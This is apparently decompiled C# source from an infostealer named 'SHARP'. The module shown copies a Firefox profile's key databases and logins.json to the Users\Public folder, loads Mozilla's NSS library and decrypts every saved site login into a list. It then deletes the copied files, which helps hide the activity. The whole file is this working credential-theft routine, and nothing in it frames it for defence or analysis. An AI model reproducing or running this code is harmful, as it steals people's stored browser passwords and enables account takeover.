﻿using System;
using System.Collections.Generic;
using System.IO;

namespace SHARP.Passwordsq
{
	// Token: 0x02000071 RID: 113
	internal class Passwords
	{
		// Token: 0x0600027C RID: 636 RVA: 0x0000F528 File Offset: 0x0000D728
		private static string CopyRequiredFiles(string profile)
		{
			string name = new DirectoryInfo(profile).Name;
			string text = Path.Combine(Passwords.CopyTempPath, name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			foreach (string path in Passwords.RequiredFiles)
			{
				try
				{
					string text2 = Path.Combine(profile, path);
					if (File.Exists(text2))
					{
						File.Copy(text2, Path.Combine(text, Path.GetFileName(text2)));
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
					return null;
				}
			}
			return Path.Combine(Passwords.CopyTempPath, name);
		}

		// Token: 0x0600027D RID: 637 RVA: 0x0000F5C8 File Offset: 0x0000D7C8
		public static List<Password> Get(string BrowserDir)
		{
			List<Password> list = new List<Password>();
			string profile = Profile.GetProfile(BrowserDir);
			if (profile == null)
			{
				return list;
			}
			string mozillaPath = Profile.GetMozillaPath();
			if (mozillaPath == null)
			{
				return list;
			}
			string text = Passwords.CopyRequiredFiles(profile);
			if (text == null)
			{
				return list;
			}
			Json json = new Json(File.ReadAllText(Path.Combine(text, "logins.json")));
			json.Remove(new string[]
			{
				",\"logins\":\\[",
				",\"potentiallyVulnerablePasswords\""
			});
			string[] array = json.SplitData("},");
			if (Decryptor.LoadNSS(mozillaPath))
			{
				if (!Decryptor.SetProfile(text))
				{
					Console.WriteLine("Failed to set profile!");
				}
				foreach (string data in array)
				{
					Password item = default(Password);
					Json json2 = new Json(data);
					string value = json2.GetValue("hostname");
					string value2 = json2.GetValue("encryptedUsername");
					string value3 = json2.GetValue("encryptedPassword");
					if (!string.IsNullOrEmpty(value3))
					{
						item.sUrl = value;
						item.sUsername = Decryptor.DecryptPassword(value2);
						item.sPassword = Decryptor.DecryptPassword(value3);
						list.Add(item);
					}
				}
				Decryptor.UnLoadNSS();
			}
			Directory.Delete(text, true);
			return list;
		}

		// Token: 0x04000139 RID: 313
		private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

		// Token: 0x0400013A RID: 314
		private static string CopyTempPath = Path.Combine(Passwords.SystemDrive, "Users\\Public");

		// Token: 0x0400013B RID: 315
		private static string[] RequiredFiles = new string[]
		{
			"key3.db",
			"key4.db",
			"logins.json",
			"cert9.db"
		};
	}
}
